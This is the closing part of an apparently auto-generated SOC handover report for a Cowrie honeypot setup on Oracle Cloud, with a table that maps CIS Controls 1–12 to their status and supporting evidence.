- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-31T21:10:36Z_
